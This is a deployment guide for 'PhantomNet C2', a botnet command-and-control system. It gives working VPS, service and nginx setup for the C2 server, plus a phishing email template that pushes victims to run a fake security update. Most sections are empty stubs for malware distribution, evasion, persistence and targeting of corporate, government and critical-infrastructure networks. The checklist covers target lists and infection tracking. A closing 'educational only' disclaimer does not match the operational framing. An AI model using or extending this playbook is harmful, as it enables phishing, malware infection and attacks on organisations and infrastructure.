# PhantomNet C2 - Windows VPS Deployment Guide

## 🚀 VPS HOSTING SETUP

### 1. Windows VPS Configuration
```powershell
# Run as Administrator
# Enable Windows Firewall exceptions
netsh advfirewall firewall add rule name="PhantomNet C2" dir=in action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name="PhantomNet Portal" dir=in action=allow protocol=TCP localport=5000

# Install Python if not present
winget install Python.Python.3.11
```

### 2. Domain & SSL Setup
```bash
# Purchase domain (recommended: .com, .net, .org)
# Point DNS to your VPS IP
# Generate SSL certificates
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

### 3. Production Deployment
```powershell
# Create deployment directory
mkdir C:\PhantomNet
cd C:\PhantomNet

# Copy all project files
# Install dependencies
pip install -r requirements.txt

# Create Windows Service
nssm install PhantomNetC2 "C:\Python311\python.exe" "C:\PhantomNet\c2_server_flask.py"
nssm install PhantomNetPortal "C:\Python311\python.exe" "C:\PhantomNet\activation_portal.py"

# Start services
nssm start PhantomNetC2
nssm start PhantomNetPortal
```

## 🌐 DOMAIN CONFIGURATION

### 1. DNS Records
```
A Record: phantom.yourdomain.com -> YOUR_VPS_IP
CNAME Record: www.phantom.yourdomain.com -> phantom.yourdomain.com
```

### 2. Reverse Proxy (Nginx)
```nginx
server {
    listen 80;
    server_name phantom.yourdomain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl;
    server_name phantom.yourdomain.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass http://localhost:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    
    location /c2/ {
        proxy_pass http://localhost:8443/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

## 📦 BOT DEPLOYMENT STRATEGIES

### 1. Email Phishing Campaign
```python
# phishing_template.py
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_phishing_email(target_email, activation_code):
    msg = MIMEMultipart()
    msg['From'] = 'noreply@yourdomain.com'
    msg['To'] = target_email
    msg['Subject'] = 'Important Security Update Required'
    
    body = f"""
    Dear User,
    
    We have detected suspicious activity on your account. 
    Please download and run the security update immediately.
    
    Download Link: https://phantom.yourdomain.com/activate
    Activation Code: {activation_code}
    
    This is urgent - please act now to secure your account.
    
    Best regards,
    Security Team
    """
    
    msg.attach(MIMEText(body, 'plain'))
    
    # Send email logic here
```

### 2. Social Media Distribution
```python
# social_media_bot.py
import tweepy
import requests

def post_malicious_link():
    # Post fake security updates, software downloads
    # Use trending hashtags to increase visibility
    pass
```

### 3. File Sharing Platforms
```python
# file_sharing_distribution.py
import os
import shutil

def create_fake_software():
    # Create fake software installers
    # Upload to file sharing sites
    # Include bot payload
    pass
```

## 🔧 ADVANCED DEPLOYMENT TECHNIQUES

### 1. Multi-Server Architecture
```python
# load_balancer.py
from flask import Flask, request, redirect
import random

servers = [
    "https://phantom1.yourdomain.com",
    "https://phantom2.yourdomain.com", 
    "https://phantom3.yourdomain.com"
]

@app.route('/')
def load_balance():
    server = random.choice(servers)
    return redirect(server)
```

### 2. CDN Integration
```python
# cdn_distribution.py
# Use Cloudflare, AWS CloudFront, or similar
# Distribute bot payloads globally
# Bypass geo-restrictions
```

### 3. Tor Network Integration
```python
# tor_integration.py
import requests
import socks

def setup_tor_proxy():
    # Configure Tor proxy for anonymous communication
    # Use .onion addresses for hidden services
    pass
```

## 📊 MONITORING & ANALYTICS

### 1. Real-time Dashboard
```python
# analytics_dashboard.py
from flask import Flask, render_template
import sqlite3

@app.route('/analytics')
def analytics():
    # Track bot infections, command success rates
    # Geographic distribution, OS statistics
    pass
```

### 2. Alert System
```python
# alert_system.py
import smtplib
import telegram

def send_alert(message):
    # Send alerts for new infections
    # Monitor system health
    # Track law enforcement activity
    pass
```

## 🛡️ EVASION TECHNIQUES

### 1. Traffic Obfuscation
```python
# traffic_obfuscation.py
import base64
import random

def obfuscate_traffic(data):
    # Encrypt all communications
    # Use steganography
    # Mimic legitimate traffic patterns
    pass
```

### 2. Anti-Analysis
```python
# anti_analysis.py
import time
import random

def detect_analysis():
    # Check for virtual machines
    # Detect debugging tools
    # Monitor system resources
    # Implement time delays
    pass
```

### 3. Persistence Mechanisms
```python
# persistence.py
import winreg
import os

def install_persistence():
    # Registry modifications
    # Startup folder placement
    # Service installation
    # DLL injection
    pass
```

## 🎯 TARGETING STRATEGIES

### 1. Corporate Networks
```python
# corporate_targeting.py
def target_corporate():
    # LinkedIn scraping for employee emails
    # Company domain enumeration
    # Spear phishing campaigns
    # Watering hole attacks
    pass
```

### 2. Government Agencies
```python
# government_targeting.py
def target_government():
    # FOIA request data mining
    # Public employee directories
    # Contract information gathering
    # Supply chain attacks
    pass
```

### 3. Critical Infrastructure
```python
# infrastructure_targeting.py
def target_infrastructure():
    # SCADA system enumeration
    # Industrial control systems
    # Energy grid targeting
    # Transportation systems
    pass
```

## 📈 SCALING TECHNIQUES

### 1. Automated Propagation
```python
# auto_propagation.py
def propagate_botnet():
    # Self-replicating mechanisms
    # Network scanning and exploitation
    # Lateral movement techniques
    # Privilege escalation
    pass
```

### 2. Botnet Management
```python
# botnet_manager.py
class BotnetManager:
    def __init__(self):
        self.bots = {}
        self.commands = {}
    
    def deploy_mass_command(self, command):
        # Execute commands on all bots
        # Monitor execution results
        # Handle failures gracefully
        pass
    
    def segment_botnet(self, criteria):
        # Group bots by location, OS, capabilities
        # Target specific segments
        # Maintain operational security
        pass
```

## 🔒 OPERATIONAL SECURITY

### 1. Communication Security
```python
# opsec.py
def secure_communications():
    # Use encrypted channels
    # Implement perfect forward secrecy
    # Rotate encryption keys
    # Use steganography
    pass
```

### 2. Infrastructure Hardening
```python
# infrastructure_security.py
def harden_infrastructure():
    # Use bulletproof hosting
    # Implement DDoS protection
    # Use multiple backup servers
    # Regular infrastructure rotation
    pass
```

## 📋 DEPLOYMENT CHECKLIST

- [ ] VPS configured with proper firewall rules
- [ ] Domain purchased and DNS configured
- [ ] SSL certificates generated and installed
- [ ] Services running as Windows services
- [ ] Monitoring and alerting systems active
- [ ] Backup and recovery procedures in place
- [ ] Operational security measures implemented
- [ ] Distribution channels prepared
- [ ] Target lists compiled
- [ ] Evasion techniques tested

## ⚠️ LEGAL DISCLAIMER

This guide is for educational and research purposes only. 
Use only on systems you own or have explicit permission to test.
Misuse may result in severe legal consequences.

## 🎯 NEXT STEPS

1. **Deploy to VPS**: Follow the setup guide above
2. **Test Infrastructure**: Verify all components work
3. **Begin Distribution**: Start with small-scale testing
4. **Monitor Results**: Track infection rates and success
5. **Scale Up**: Gradually increase deployment scope
6. **Maintain OPSEC**: Keep infrastructure secure and hidden

Remember: Success depends on careful planning, proper execution, and maintaining operational security at all times.
